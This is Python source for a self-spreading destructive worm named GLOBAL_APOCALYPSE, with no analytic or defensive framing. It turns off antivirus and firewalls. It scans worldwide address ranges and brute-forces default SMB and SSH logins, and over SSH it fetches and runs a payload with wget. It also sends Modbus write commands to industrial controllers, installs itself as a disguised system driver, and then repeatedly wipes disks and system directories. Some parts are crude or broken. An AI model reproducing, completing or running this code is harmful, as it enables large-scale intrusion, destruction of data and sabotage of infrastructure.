
import os
import sys
import subprocess
import threading
import socket
import random
import time
import platform
import hashlib
import struct

class GLOBAL_APOCALYPSE:
    def __init__(self):
        self.current_path = os.path.abspath(sys.argv[0])
        self.is_windows = platform.system().lower() == 'windows'
        self.machine_id = self._get_hardware_id()
        self.execution_time = time.time() + random.randint(5, 30)
        self.infected_hosts = set()
        self.country_networks = self._get_world_networks_except_china()
        
    def _get_hardware_id(self):
        try:
            if self.is_windows:
                result = subprocess.run('wmic csproduct get uuid', capture_output=True, text=True, shell=True, timeout=1)
                return hashlib.sha256(result.stdout.encode()).hexdigest()[:32]
            else:
                with open('/etc/machine-id', 'r') as f:
                    return hashlib.sha256(f.read().encode()).hexdigest()[:32]
        except:
            return hashlib.sha256(str(random.random()).encode()).hexdigest()[:32]

    def _get_world_networks_except_china(self):
        world_cidrs = [
            # North America
            '3.0.0.0/8', '4.0.0.0/8', '6.0.0.0/8', '7.0.0.0/8', '8.0.0.0/8',
            '9.0.0.0/8', '11.0.0.0/8', '12.0.0.0/8', '13.0.0.0/8', '15.0.0.0/8',
            '16.0.0.0/8', '17.0.0.0/8', '18.0.0.0/8', '19.0.0.0/8', '20.0.0.0/8',
            '23.0.0.0/8', '24.0.0.0/8', '25.0.0.0/8', '26.0.0.0/8', '29.0.0.0/8',
            '32.0.0.0/8', '34.0.0.0/8', '35.0.0.0/8', '38.0.0.0/8', '40.0.0.0/8',
            '45.0.0.0/8', '47.0.0.0/8', '48.0.0.0/8', '50.0.0.0/8', '52.0.0.0/8',
            '54.0.0.0/8', '56.0.0.0/8', '63.0.0.0/8', '64.0.0.0/8', '65.0.0.0/8',
            '66.0.0.0/8', '67.0.0.0/8', '68.0.0.0/8', '69.0.0.0/8', '70.0.0.0/8',
            '71.0.0.0/8', '72.0.0.0/8', '73.0.0.0/8', '74.0.0.0/8', '75.0.0.0/8',
            '76.0.0.0/8', '96.0.0.0/8', '97.0.0.0/8', '98.0.0.0/8', '99.0.0.0/8',
            
            # Europe
            '2.0.0.0/8', '5.0.0.0/8', '25.0.0.0/8', '31.0.0.0/8', '37.0.0.0/8',
            '46.0.0.0/8', '51.0.0.0/8', '52.0.0.0/8', '53.0.0.0/8', '54.0.0.0/8',
            '57.0.0.0/8', '62.0.0.0/8', '77.0.0.0/8', '78.0.0.0/8', '79.0.0.0/8',
            '80.0.0.0/8', '81.0.0.0/8', '82.0.0.0/8', '83.0.0.0/8', '84.0.0.0/8',
            '85.0.0.0/8', '86.0.0.0/8', '87.0.0.0/8', '88.0.0.0/8', '89.0.0.0/8',
            '90.0.0.0/8', '91.0.0.0/8', '92.0.0.0/8', '93.0.0.0/8', '94.0.0.0/8',
            '95.0.0.0/8', '109.0.0.0/8', '141.0.0.0/8', '145.0.0.0/8', '151.0.0.0/8',
            '176.0.0.0/8', '178.0.0.0/8', '185.0.0.0/8', '188.0.0.0/8', '193.0.0.0/8',
            '194.0.0.0/8', '195.0.0.0/8', '212.0.0.0/8', '213.0.0.0/8',
            
            # Middle East
            '46.0.0.0/8', '78.0.0.0/8', '79.0.0.0/8', '80.0.0.0/8', '81.0.0.0/8',
            '82.0.0.0/8', '83.0.0.0/8', '84.0.0.0/8', '85.0.0.0/8', '86.0.0.0/8',
            '87.0.0.0/8', '88.0.0.0/8', '89.0.0.0/8', '90.0.0.0/8', '91.0.0.0/8',
            
            # Asia (Except China)
            '14.0.0.0/8', '27.0.0.0/8', '36.0.0.0/8', '39.0.0.0/8', '42.0.0.0/8',
            '49.0.0.0/8', '58.0.0.0/8', '59.0.0.0/8', '60.0.0.0/8', '61.0.0.0/8',
            '101.0.0.0/8', '103.0.0.0/8', '106.0.0.0/8', '110.0.0.0/8', '111.0.0.0/8',
            '112.0.0.0/8', '113.0.0.0/8', '114.0.0.0/8', '115.0.0.0/8', '116.0.0.0/8',
            '117.0.0.0/8', '118.0.0.0/8', '119.0.0.0/8', '120.0.0.0/8', '121.0.0.0/8',
            '122.0.0.0/8', '123.0.0.0/8', '124.0.0.0/8', '125.0.0.0/8', '126.0.0.0/8',
            '133.0.0.0/8', '150.0.0.0/8', '153.0.0.0/8', '157.0.0.0/8', '163.0.0.0/8',
            '175.0.0.0/8', '180.0.0.0/8', '182.0.0.0/8', '183.0.0.0/8', '202.0.0.0/8',
            '203.0.0.0/8', '210.0.0.0/8', '211.0.0.0/8', '218.0.0.0/8', '219.0.0.0/8',
            '220.0.0.0/8', '221.0.0.0/8', '222.0.0.0/8',
            
            # South America
            '131.0.0.0/8', '138.0.0.0/8', '143.0.0.0/8', '150.0.0.0/8', '152.0.0.0/8',
            '164.0.0.0/8', '168.0.0.0/8', '170.0.0.0/8', '172.0.0.0/8', '174.0.0.0/8',
            '177.0.0.0/8', '179.0.0.0/8', '181.0.0.0/8', '186.0.0.0/8', '187.0.0.0/8',
            '189.0.0.0/8', '190.0.0.0/8', '191.0.0.0/8', '200.0.0.0/8', '201.0.0.0/8',
            
            # Africa
            '41.0.0.0/8', '102.0.0.0/8', '105.0.0.0/8', '129.0.0.0/8', '154.0.0.0/8',
            '156.0.0.0/8', '160.0.0.0/8', '164.0.0.0/8', '165.0.0.0/8', '168.0.0.0/8',
            '169.0.0.0/8', '196.0.0.0/8', '197.0.0.0/8', '212.0.0.0/8',
            
            # Oceania
            '14.0.0.0/8', '27.0.0.0/8', '36.0.0.0/8', '39.0.0.0/8', '42.0.0.0/8',
            '49.0.0.0/8', '58.0.0.0/8', '59.0.0.0/8', '60.0.0.0/8', '61.0.0.0/8',
            '101.0.0.0/8', '103.0.0.0/8', '110.0.0.0/8', '111.0.0.0/8', '112.0.0.0/8',
            '113.0.0.0/8', '114.0.0.0/8', '115.0.0.0/8', '116.0.0.0/8', '117.0.0.0/8',
            '118.0.0.0/8', '119.0.0.0/8', '120.0.0.0/8', '121.0.0.0/8', '122.0.0.0/8',
            '123.0.0.0/8', '124.0.0.0/8', '125.0.0.0/8', '126.0.0.0/8', '133.0.0.0/8',
            '139.0.0.0/8', '140.0.0.0/8', '143.0.0.0/8', '144.0.0.0/8', '149.0.0.0/8',
            '150.0.0.0/8', '153.0.0.0/8', '155.0.0.0/8', '162.0.0.0/8', '163.0.0.0/8',
            '175.0.0.0/8', '180.0.0.0/8', '182.0.0.0/8', '183.0.0.0/8', '202.0.0.0/8',
            '203.0.0.0/8', '210.0.0.0/8', '211.0.0.0/8', '218.0.0.0/8', '219.0.0.0/8',
            '220.0.0.0/8', '221.0.0.0/8', '222.0.0.0/8'
        ]
        return world_cidrs

    def _execute_stealth(self, cmd, timeout=2):
        try:
            if self.is_windows:
                startupinfo = subprocess.STARTUPINFO()
                startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
                startupinfo.wShowWindow = 0
                creationflags = subprocess.CREATE_NO_WINDOW
            else:
                startupinfo = None
                creationflags = 0
            
            proc = subprocess.Popen(
                cmd,
                shell=True,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                stdin=subprocess.DEVNULL,
                creationflags=creationflags,
                startupinfo=startupinfo
            )
            
            try:
                proc.wait(timeout=timeout)
                return True
            except:
                return True
        except:
            return False

    def _disable_security(self):
        if self.is_windows:
            cmds = [
                'net stop WinDefend /y',
                'sc config WinDefend start= disabled',
                'netsh advfirewall set allprofiles state off',
                'taskkill /f /im MsMpEng.exe /im SecurityHealthService.exe 2>nul',
                'powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"',
            ]
        else:
            cmds = [
                'systemctl stop ufw apparmor selinux 2>/dev/null',
                'systemctl disable ufw apparmor selinux 2>/dev/null',
                'iptables -F',
                'setenforce 0 2>/dev/null',
            ]
        
        for cmd in cmds:
            self._execute_stealth(cmd, 1)

    def _scan_world_network(self, cidr):
        base_ip = cidr.split('.')[0]
        targets = []
        
        for i in range(1, 255):
            for j in range(1, 255):
                ip = f"{base_ip}.{random.randint(1, 255)}.{i}.{j}"
                targets.append(ip)
                if len(targets) >= 500:
                    return targets
        return targets

    def _quick_global_scan(self, ip):
        ports = [445, 22, 3389, 21, 23, 80, 443, 502, 44818, 8080, 8443]
        for port in ports:
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                    sock.settimeout(0.3)
                    if sock.connect_ex((ip, port)) == 0:
                        return port
            except:
                continue
        return None

    def _infect_global_target(self, ip, port):
        if port == 445:
            return self._infect_windows(ip)
        elif port == 22:
            return self._infect_linux(ip)
        elif port in [502, 44818]:
            return self._infect_industrial(ip, port)
        else:
            return self._infect_generic(ip, port)

    def _infect_windows(self, ip):
        users = ['Administrator', 'admin', 'User', 'Guest']
        passwords = ['', 'admin', 'password', '123456', 'Passw0rd']
        
        for user in users:
            for pwd in passwords:
                try:
                    net_use = f'net use \\\\{ip}\\C$ /user:{user} "{pwd}" 2>nul'
                    if self._execute_stealth(net_use, 1):
                        copy_cmd = f'copy "{self.current_path}" "\\\\{ip}\\C$\\Windows\\System32\\drivers\\atapi.sys" 2>nul'
                        if self._execute_stealth(copy_cmd, 2):
                            self._execute_stealth(f'net use \\\\{ip}\\C$ /delete /y 2>nul', 0.5)
                            return True
                except:
                    continue
        return False

    def _infect_linux(self, ip):
        users = ['root', 'admin', 'ubuntu', 'centos']
        passwords = ['', 'root', 'admin', 'password', '123456']
        
        for user in users:
            for pwd in passwords:
                try:
                    ssh_cmd = f'ssh -o StrictHostKeyChecking=no -o ConnectTimeout=1 {user}@{ip} "wget -q -O /tmp/.sysupd http://example.com/payload.sh && chmod +x /tmp/.sysupd && nohup /tmp/.sysupd &" 2>/dev/null'
                    if self._execute_stealth(ssh_cmd, 2):
                        return True
                except:
                    continue
        return False

    def _infect_industrial(self, ip, port):
        try:
            payload = b'\x00\x00\x00\x00\x00\x06\x01\x05\x00\x00\xff\x00'
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            sock.connect((ip, port))
            sock.send(payload)
            sock.close()
            return True
        except:
            return False

    def _infect_generic(self, ip, port):
        try:
            http_payload = f'POST /upload HTTP/1.1\r\nHost: {ip}\r\n\r\n'.encode()
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            sock.connect((ip, port))
            sock.send(http_payload)
            sock.close()
            return True
        except:
            return False

    def _worldwide_infection(self):
        while True:
            target_country = random.choice(self.country_networks)
            targets = self._scan_world_network(target_country)
            
            for ip in targets:
                if ip not in self.infected_hosts:
                    port = self._quick_global_scan(ip)
                    if port:
                        if self._infect_global_target(ip, port):
                            self.infected_hosts.add(ip)
                    
                    time.sleep(0.01)

    def _setup_persistence(self):
        if self.is_windows:
            self._execute_stealth(f'copy "{self.current_path}" "C:\\Windows\\System32\\drivers\\atapi.sys"', 1)
            self._execute_stealth('reg add "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v SystemDriver /t REG_SZ /d "C:\\Windows\\System32\\drivers\\atapi.sys" /f', 0.5)
        else:
            self._execute_stealth(f'cp "{self.current_path}" "/bin/systemd" && chmod +x "/bin/systemd"', 1)
            self._execute_stealth('echo "@reboot /bin/systemd" | crontab -', 0.5)

    def _global_infrastructure_destruction(self):
        if self.is_windows:
            cmds = [
                'vssadmin delete shadows /all /quiet 2>nul',
                'bcdedit /set {default} recoveryenabled no 2>nul',
                'del /f /q C:\\Windows\\System32\\*.dll 2>nul',
                'format C: /FS:NTFS /Q /Y 2>nul',
                'wmic diskdrive get index | foreach {format $_.index} 2>nul'
            ]
        else:
            cmds = [
                'rm -rf /etc /bin /sbin /usr 2>/dev/null',
                'dd if=/dev/zero of=/dev/sda bs=1M count=100 2>/dev/null',
                'echo 1 > /proc/sys/kernel/sysrq && echo b > /proc/sysrq-trigger 2>/dev/null'
            ]
        
        for cmd in cmds:
            self._execute_stealth(cmd, 3)

    def run(self):
        self._disable_security()
        self._setup_persistence()
        
        for _ in range(20):
            threading.Thread(target=self._worldwide_infection, daemon=True).start()
        
        while True:
            current_time = time.time()
            
            if current_time >= self.execution_time:
                self._global_infrastructure_destruction()
                self.execution_time = current_time + 15
            
            time.sleep(0.1)

if __name__ == "__main__":
    GLOBAL_APOCALYPSE().run()